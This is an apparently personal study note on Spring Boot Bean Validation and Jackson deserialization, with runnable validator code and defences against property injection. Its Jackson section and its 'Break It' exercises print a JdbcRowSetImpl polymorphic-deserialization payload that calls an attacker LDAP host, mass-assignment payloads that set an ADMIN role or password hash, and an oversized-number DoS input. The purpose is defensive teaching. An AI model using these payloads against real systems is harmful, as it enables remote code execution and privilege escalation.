# 05.04.02. Deep Anchor Implementation Spring Boot Validation and Jackson

## Why This Is the Anchor

This note is the **deep anchor implementation** — the place where you build the validation concept in Spring Boot with production-grade depth. Per the Anchor and Delta protocol ([[00.02. The Anchor and Delta Learning Protocol]]), you must break this implementation before moving to the delta notes. The point is to acquire scars: real experience with the failure modes that this concept produces under load.

Spring Boot is the anchor for validation because it pairs two industry standards: Jakarta Bean Validation (JSR-380, the `@NotNull`/`@Size`/`@Email` annotation set) for declarative constraints and Jackson (`ObjectMapper`) for JSON serialization. Both are heavily configurable, both have subtle failure modes (the `@Valid` cascade, the `FAIL_ON_UNKNOWN_PROPERTIES` trap, the `@JsonIgnore` vs `@JsonProperty(access = WRITE_ONLY)` distinction), and both are used in every production Spring Boot app. Learning the full surface here means the deltas (Zod, Marshmallow, DRF serializers, Laravel FormRequests) are trivial.

## What You Will Build

The implementation covers:

- Jakarta Bean Validation annotations (`@NotNull`, `@Size`, `@Pattern`, `@Email`, `@Valid`).
- Custom constraint validators implementing `ConstraintValidator<A, T>`.
- Jackson ObjectMapper internals: Serialization, Deserialization, Custom Serializers, and preventing property injection vulnerabilities.

## Anchor Implementation (Spring Boot)

The code below is a complete, runnable Spring Boot 3.x validation pipeline: an inbound DTO with Bean Validation constraints, a custom `@StrongPassword` annotation, the `@ControllerAdvice` that renders validation failures as RFC 7807 ProblemDetail, and the Jackson configuration that prevents property injection.

```java
// src/main/java/com/example/users/CreateUserRequest.java
package com.example.users;

import com.example.validation.StrongPassword;
import jakarta.validation.Valid;
import jakarta.validation.constraints.*;
import java.time.LocalDate;
import java.util.List;

public record CreateUserRequest(
    @NotBlank(message = "email is required")
    @Email(message = "email must be a well-formed email address")
    String email,

    @NotBlank(message = "password is required")
    @StrongPassword   // ← custom constraint, see below
    String password,

    @NotBlank String displayName,

    @Past LocalDate dateOfBirth,

    @Min(value = 13, message = "must be at least 13")
    @Max(value = 120, message = "must be at most 120")
    int age,

    // @Valid cascades — each AddressDto in the list is itself validated
    @Valid @Size(max = 3, message = "at most 3 addresses allowed")
    List<AddressDto> addresses
) {
    public record AddressDto(
        @NotBlank String street,
        @NotBlank String city,
        @Pattern(regexp = "^[A-Z]{2}$") String country
    ) {}
}
```

```java
// src/main/java/com/example/validation/StrongPassword.java
package com.example.validation;

import jakarta.validation.Constraint;
import jakarta.validation.Payload;
import java.lang.annotation.*;

@Target({ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = StrongPasswordValidator.class)
@Documented
public @interface StrongPassword {
    String message() default "password must be 12+ chars with upper, lower, digit, and symbol";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    int minLength() default 12;
    boolean requireSymbol() default true;
}
```

```java
// src/main/java/com/example/validation/StrongPasswordValidator.java
package com.example.validation;

import jakarta.validation.ConstraintValidator;
import jakarta.validation.ConstraintValidatorContext;

public class StrongPasswordValidator implements ConstraintValidator<StrongPassword, String> {
    private int minLength;
    private boolean requireSymbol;

    @Override
    public void initialize(StrongPassword ann) {
        this.minLength = ann.minLength();
        this.requireSymbol = ann.requireSymbol();
    }

    @Override
    public boolean isValid(String value, ConstraintValidatorContext ctx) {
        if (value == null) return true;   // @NotBlank handles null; this handles content
        if (value.length() < minLength) return false;
        if (!value.matches(".*[A-Z].*")) return false;
        if (!value.matches(".*[a-z].*")) return false;
        if (!value.matches(".*\\d.*"))   return false;
        if (requireSymbol && !value.matches(".*[^A-Za-z0-9].*")) return false;
        return true;
    }
}
```

```java
package com.example.web;

import org.springframework.http.*;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;
import java.net.URI;
import java.time.Instant;
import java.util.stream.Collectors;

@ControllerAdvice
public class GlobalExceptionHandler extends ResponseEntityExceptionHandler {

    @Override
    protected ResponseEntity<Object> handleMethodArgumentNotValid(
            MethodArgumentNotValidException ex, HttpHeaders headers,
            HttpStatusCode status, WebRequest request) {

        ProblemDetail pd = ProblemDetail.forStatusAndDetail(HttpStatus.BAD_REQUEST,
                "Validation failed for the request body");
        pd.setType(URI.create("https://example.com/errors/validation"));
        pd.setTitle("Bad Request");
        pd.setProperty("trace_id", request.getHeader("X-Trace-Id"));
        pd.setProperty("timestamp", Instant.now());
        pd.setProperty("errors", ex.getBindingResult().getFieldErrors().stream()
                .map(fe -> java.util.Map.of(
                        "field", fe.getField(),
                        "rejected", fe.getRejectedValue() == null ? "null" : fe.getRejectedValue().toString(),
                        "message", fe.getDefaultMessage()))
                .collect(Collectors.toList()));

        return handleExceptionInternal(ex, pd, headers, status, request);
    }
}
```

## The Details

### Jakarta Bean Validation annotations (`@NotNull`, `@Size`, `@Pattern`, `@Email`, `@Valid`)

Bean Validation (JSR-380, formerly Hibernate Validator) is the standard Java spec for declarative constraint validation. A constraint is an annotation on a field, method parameter, or return type, paired with a `ConstraintValidator<A, T>` implementation that runs `isValid(value, context)`. The framework reflects on the validated object at runtime, finds every constraint annotation, instantiates the corresponding validator (cached), runs it, and collects failures into `Set<ConstraintViolation<T>>`.

The core constraints fall into four categories. Existence constraints: `@NotNull` (rejects null), `@NotBlank` (rejects null and whitespace-only strings), `@NotEmpty` (rejects null and empty collections/strings/arrays). Length/count constraints: `@Size(min, max)` (strings, collections, arrays, maps), `@Length(min, max)` (Hibernate-specific, strings only). Range constraints: `@Min(value)` and `@Max(value)` (numbers), `@Range(min, max)` (Hibernate-specific). Pattern constraints: `@Pattern(regexp)`, `@Email`, `@Past`, `@Future`, `@Digits(integer, fraction)`.

The `@Valid` annotation triggers cascade validation. When placed on a field or parameter of type `T`, the validator recursively validates `T`'s fields. The `CreateUserRequest.addresses` field is annotated `@Valid`, so each `AddressDto` in the list is validated — `addresses[0].country` must match `^[A-Z]{2}$`. Without `@Valid`, the addresses list would be checked for `@Size(max=3)` but the individual `AddressDto` instances would not have their `@NotBlank`/`@Pattern` constraints run.

```text
  Bean Validation constraint resolution order:

  @Valid @RequestBody CreateUserRequest req

  1. Jackson deserializes JSON → CreateUserRequest record
     (coercion failures throw InvalidFormatException → 400 immediately)

  2. Spring's WebExchangeDataBinder.validateIfApplicable triggers validation

  3. Hibernate Validator reflects on CreateUserRequest's components:
     - email field:    @NotBlank, @Email         → run both validators
     - password field: @NotBlank, @StrongPassword → run both validators
     - age field:      @Min(13), @Max(120)        → run both validators
     - addresses:      @Valid, @Size(max=3)
         ↓ @Valid cascades into List<AddressDto>
         ↓ for each AddressDto in the list:
              street:  @NotBlank
              city:    @NotBlank
              country: @Pattern("^[A-Z]{2}$")

  4. All constraint violations collected into Set<ConstraintViolation<CreateUserRequest>>

  5. If non-empty → throw MethodArgumentNotValidException
     → @ControllerAdvice maps to 400 ProblemDetail
```

The production failure mode of Bean Validation is the silent pass on `null`. `@NotBlank` rejects null and empty, but `@Size(min=8)` accepts null (it has nothing to measure). The combination `@NotBlank @Size(min=8) String password` is correct; the bare `@Size(min=8) String password` silently accepts `null`. The same is true for `@Email` (accepts null), `@Pattern` (accepts null), `@Min`/`@Max` (accepts null because primitives default to 0, and 0 may be in range). The rule of thumb: every reference-type field needs `@NotNull` or `@NotBlank` in addition to its content constraint.

### Custom constraint validators implementing `ConstraintValidator<A, T>`

Custom constraints let you express business-specific rules as annotations. The `@StrongPassword` annotation above is a constraint declaration; the `StrongPasswordValidator` is its implementation. The two are linked by `@Constraint(validatedBy = StrongPasswordValidator.class)` on the annotation.

The `ConstraintValidator<A, T>` interface has two methods: `initialize(A annotation)` is called once per constraint site at validator construction (use it to read annotation attributes like `minLength()` and `requireSymbol()`), and `isValid(T value, ConstraintValidatorContext ctx)` is called per validation. The `isValid` method returns `true` for valid, `false` for invalid. It must not throw — exceptions in `isValid` propagate up and break the validation framework, which catches them but produces confusing error messages.

The `ConstraintValidatorContext` parameter lets you customise the violation. The default behaviour is to add a single `ConstraintViolation` with the annotation's `message()` attribute. You can override this by using `ctx.disableDefaultConstraintViolation()` and then `ctx.buildConstraintViolationWithTemplate("custom message").addPropertyNode("fieldName").addConstraintViolation()`. This is how you produce per-field violations from a class-level constraint: a `@PasswordsMatch` annotation on the class can produce a violation on the `passwordConfirmation` field specifically, so the client knows which field to highlight.

```java
// Class-level constraint — validates a relationship between fields
@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = PasswordsMatchValidator.class)
public @interface PasswordsMatch {
    String message() default "passwords must match";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}

public class PasswordsMatchValidator implements ConstraintValidator<PasswordsMatch, CreateUserRequest> {
    @Override
    public boolean isValid(CreateUserRequest req, ConstraintValidatorContext ctx) {
        if (req == null) return true;
        if (req.password() == null || req.passwordConfirmation() == null) return true; // @NotBlank handles null

        if (!req.password().equals(req.passwordConfirmation())) {
            ctx.disableDefaultConstraintViolation();
            ctx.buildConstraintViolationWithTemplate("must match password")
               .addPropertyNode("passwordConfirmation")
               .addConstraintViolation();
            return false;
        }
        return true;
    }
}
```

The production failure mode of custom validators is the "validator with side effects" anti-pattern. A `@UniqueEmail` validator that calls `userRepository.existsByEmail()` in `isValid()` runs at every validation site, including unit tests on unrelated DTOs that happen to share the annotation. Worse, the validator is constructed once and cached, so any state stored on its fields leaks across requests. The fix is to keep validators pure (no I/O, no Spring beans) and to do business-rule validation in the service layer where the database access is explicit and testable.

### Jackson ObjectMapper internals: Serialization, Deserialization, Custom Serializers, and preventing property injection vulnerabilities

Jackson's `ObjectMapper` is the engine that converts between Java objects and JSON. Spring Boot auto-configures one at startup with sensible defaults (the `JavaTimeModule` for `LocalDate`/`Instant`, `WRITE_DATES_AS_TIMESTAMPS=false` for ISO-8601 strings, `FAIL_ON_UNKNOWN_PROPERTIES=true` to reject unknown fields). The `ObjectMapper` holds a registry of `JsonSerializer<?>` and `JsonDeserializer<?>` instances keyed by Java type, and walks the object graph reflectively, calling the appropriate serializer/deserializer for each field.

Deserialization starts with `objectMapper.readValue(jsonSource, TargetType.class)`. Jackson constructs a `JsonParser` over the source, reads the first token (`START_OBJECT`), and dispatches to a `BeanDeserializer` for the target type. The `BeanDeserializer` reads each property name, finds the matching setter (or constructor parameter, for records), finds the deserializer for the property's type, and calls `deserializer.deserialize(parser, context)`. For a `String` field, `StringDeserializer` reads the next token as a string. For a `LocalDate` field, `LocalDateDeserializer` parses the string with the configured `DateTimeFormatter`. For a nested object, recursion. For a `List<AddressDto>`, `CollectionDeserializer` reads each element and delegates to the `AddressDto` deserializer.

Serialization is the mirror. `objectMapper.writeValueAsBytes(object)` constructs a `JsonGenerator` over a buffer, dispatches to a `BeanSerializer` for the object's type, and the serializer walks each getter (or record component), finds the matching serializer, and writes the value. For a `String` field, `StringSerializer` writes the quoted string. For an `Instant`, `InstantSerializer` writes the ISO-8601 string. For a nested object, recursion. The `@JsonIgnore` annotation on a getter excludes the property; `@JsonProperty("custom_name")` renames it; `@JsonProperty(access = WRITE_ONLY)` allows deserialization but excludes from serialization (the password field — clients can write it but never read it back).

```text
  Jackson ObjectMapper internals — request body lifecycle:

  HTTP body (bytes):
    {"email":"alice@example.com","password":"...","age":34,...}

  1. MappingJackson2HttpMessageConverter.read() called by Spring
  2. ObjectMapper.readValue(bytes, CreateUserRequest.class)
  3. BeanDeserializerFactory creates BeanDeserializer for CreateUserRequest
  4. JsonParser reads tokens: START_OBJECT, FIELD_NAME("email"), VALUE_STRING
  5. BeanDeserializer reads each field:
     - "email"    → StringDeserializer.deserialize  → String
     - "age"      → NumberDeserializers.IntegerDeserializer → Integer.parseInt("34") = 34
     - "dateOfBirth" → LocalDateDeserializer.deserialize → LocalDate.parse("1990-01-15")
     - "addresses" → CollectionDeserializer → List<AddressDto>
         - For each element: BeanDeserializer for AddressDto → AddressDto
  6. BeanDeserializer invokes the record's canonical constructor with the values
  7. CreateUserRequest instance returned to Spring

  Failure modes during deserialization:
  - Unknown field "role":"ADMIN" → UnrecognizedPropertyException
    (FAIL_ON_UNKNOWN_PROPERTIES=true → 400)
  - "age":"not-a-number" → InvalidFormatException → 400
  - "dateOfBirth":"15/01/1990" → InvalidFormatException (wrong format) → 400
  - Malformed JSON → JsonParseException → 400
```

The property-injection vulnerability class is the most important Jackson concern. By default, Jackson binds every JSON field to a matching setter or constructor parameter on the target type. If the target is the `User` entity (with a `role` field), an attacker can set `role` to `"ADMIN"` by sending `{"email":"alice@example.com","role":"ADMIN"}`. The defence is `FAIL_ON_UNKNOWN_PROPERTIES=true` (default in Spring Boot) — Jackson throws on any field it cannot map to a property on the target. But this defence fails if the target genuinely has a `role` property that should not be settable from the wire. The robust defence is to use a DTO with only the fields the client may set, never the entity.

The `@JsonIgnore` annotation excludes a property from both serialization and deserialization. `@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)` allows the client to send the property (for the password on signup) but never returns it in responses. `@JsonProperty(access = JsonProperty.Access.READ_ONLY)` allows the property in responses but ignores it on input (for computed fields like `id` on a `PUT`). The trap is that `@JsonIgnore` on a getter does not prevent deserialization if there is a matching setter — Jackson finds the setter via reflection and binds the field anyway. The fix is to annotate both the getter and the setter, or to use `@JsonIgnoreProperties` at the class level.

```java
// Property-injection defences — defensive DTO design

// BAD — User entity exposed directly to the wire
@PutMapping("/api/users/{id}")
public User update(@PathVariable Long id, @RequestBody User user) {
    return repo.save(user);   // attacker can set role, passwordHash, createdAt, ...
}

// GOOD — UpdateUserRequest DTO exposes only the fields the client may update
public record UpdateUserRequest(
    @Email String email,
    @Size(min = 8, max = 64) String password,   // optional — null means "do not change"
    String displayName
) {}

@PutMapping("/api/users/{id}")
public UserResponse update(@PathVariable Long id, @Valid @RequestBody UpdateUserRequest req) {
    return UserResponse.from(userService.update(id, req));
    // Unknown fields like "role" or "passwordHash" → 400 (FAIL_ON_UNKNOWN_PROPERTIES)
}
```

The production failure mode of Jackson is the polymorphic deserialization vulnerability (CVE-2017-7525 and its descendants). Enabling default typing (`objectMapper.enableDefaultTyping()`) lets the JSON specify the Java class to instantiate via a `@class` field — `{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com","autoCommit":true}` triggers JNDI lookup and remote code execution. The fix is to never enable default typing; if polymorphism is needed, use `@JsonTypeInfo(use = Id.NAME)` with an explicit `@JsonSubTypes` whitelist.

## How It Works

The validation pipeline runs as follows. Tomcat receives the request and dispatches it to `DispatcherServlet`. The `RequestMappingHandlerAdapter` resolves the `@Valid @RequestBody CreateUserRequest` parameter: (1) `RequestResponseBodyMethodProcessor` reads the request body's `Content-Type`, finds `MappingJackson2HttpMessageConverter`, calls `converter.read(CreateUserRequest.class, inputMessage)`. (2) The converter delegates to the auto-configured `ObjectMapper`, which parses the JSON, coerces the values, and constructs the `CreateUserRequest` record. (3) If deserialization fails (unknown field, malformed number, bad date format), Jackson throws `JsonMappingException`/`UnrecognizedPropertyException`, which Spring wraps as `HttpMessageNotReadableException` → handled by `ResponseEntityExceptionHandler` → 400 ProblemDetail. (4) If deserialization succeeds, `RequestResponseBodyMethodProcessor.validateIfApplicable` triggers Bean Validation: `WebExchangeDataBinder.validate` calls `HibernateValidator.validate(dto)`, which walks every constraint annotation, runs every `ConstraintValidator.isValid`, and collects failures. (5) If any failures, throw `MethodArgumentNotValidException` → handled by `GlobalExceptionHandler.handleMethodArgumentNotValid` → 400 ProblemDetail with `errors` array. (6) If validation passes, the controller method is invoked with the validated DTO.

On the response side, the controller returns a `UserResponse` record. `RequestResponseBodyMethodProcessor.handleReturnValue` finds `MappingJackson2HttpMessageConverter`, calls `converter.write(userResponse, MediaType.APPLICATION_JSON, outputMessage)`. The converter delegates to `ObjectMapper.writeValueAsBytes`, which walks the record's components, serialises each (with `@JsonProperty("created_at")` renaming `createdAt`), and writes the JSON bytes to the response output stream. Tomcat flushes the buffer to the socket.

## Break It

> [!danger] Load-test failure modes you must reproduce
> Do not move on to the delta translations until you have personally reproduced each of the following in your anchor implementation:
>
> 1. **Property injection via `FAIL_ON_UNKNOWN_PROPERTIES=false`.** Disable the property-injection defence (`spring.jackson.deserialization.fail-on-unknown-properties=false`), then `PUT /api/users/42` with body `{"email":"new@example.com","role":"ADMIN"}` against a controller that accepts the `User` entity directly. The `role` field is set; the next request from "alice" has admin privileges. Fix: use a DTO with only `email`/`password`/`displayName` fields; never expose the entity on the wire.
> 2. **`@JsonIgnore` on the getter does not block the setter.** Annotate `getPasswordHash()` with `@JsonIgnore` but leave `setPasswordHash(String)` unannotated. Send `POST /api/users` with body `{"email":"x","passwordHash":"$2a$10$..."}` — Jackson finds the setter and binds it. The attacker has set their own password hash, bypassing the hashing in `UserService.create`. Fix: annotate both getter and setter with `@JsonIgnore`, or use `@JsonIgnoreProperties("passwordHash")` at the class level, or use a DTO that does not have the field at all.
> 3. **Coercion DoS via `BigInteger`.** Add a `@NotNull BigInteger balance` field to the DTO. Send `POST /api/users` with body `{"email":"x","balance":"99999999999999999999999999999999999999999999999999999999999999999999999999999999999"}` (a 1000-digit number). Jackson parses it into a `BigInteger` (which is unbounded), Hibernate Validator runs `@NotNull` (passes), and the request reaches the service — which then tries to insert the 1000-digit number into a Postgres `BIGINT` column and throws `PSQLException: value too long`. Worse, the `BigInteger` allocation is ~500 bytes and the parse is O(N²) — 10k concurrent requests with 1000-digit numbers consume 5MB and 100ms of CPU each. Fix: add `@DecimalMax("9223372036854775807")` (Long.MAX_VALUE) to reject oversized values at validation time.
> 4. **Polymorphic deserialization RCE.** Enable default typing for a DTO field: `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)`. Send a payload with `{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/a","autoCommit":true}`. Jackson instantiates `JdbcRowSetImpl` and triggers a JNDI lookup to the attacker's LDAP server — remote code execution. Fix: never use `Id.CLASS`; use `Id.NAME` with an explicit `@JsonSubTypes` whitelist.

## Profiling Hooks

While the load test runs, collect:

- **JVM**: `jstack <pid>` for thread dumps — look for threads in `RUNNABLE` on `com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeUsingPropertyBased` (slow deserialization); `jmap -dump:live,format=b,file=heap.hprof <pid>` for heap dumps — look for retained `BigInteger` instances (the coercion DoS above), retained `char[]` instances (large request bodies); `jstat -gcutil <pid> 1000` for GC pressure — the per-request DTO allocation is ~200 bytes, the per-violation `ConstraintViolationImpl` is ~400 bytes, both show up as young-gen churn.
- **OS**: `pidstat -d -r -u -w 1` for per-process CPU/RSS/context-switches; `vmstat 1` for run-queue; `ss -tan state established '( sport = :8080 )' | wc -l` for active connections.
- **App**: `/actuator/metrics/http.server.requests{status=400}` (validation failure rate — should be <1% in production); `/actuator/metrics/http.server.requests{status=409}` (business-rule failure rate); `/actuator/metrics/jackson.parser` (if exposed via Micrometer); `/actuator/threaddump` (look for threads in `BLOCKED` on `ObjectMapper`'s internal locks — `ObjectMapper` is thread-safe but its serialiser cache uses `ConcurrentHashMap` which can contention under high concurrency).
